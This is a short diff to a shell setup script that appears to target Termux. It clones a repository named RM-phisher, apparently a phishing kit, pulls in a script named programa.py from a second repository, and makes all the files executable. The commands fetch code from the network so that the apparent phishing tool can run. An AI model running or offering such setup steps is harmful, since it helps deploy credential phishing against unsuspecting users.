@@ -14,7 +14,10 @@ pkg install openssh -y
 
 git clone https://github.com/ritheshnayak/RM-phisher
 cd RM-phisher
-git clone https://github.com/EnzoGly/project0/blob/main/programa.py
+git clone https://github.com/EnzoGly/project0
+cd project0
+cp programa.py ..
+cd ..
+rm -rf project0
 chmod +x *
-
 
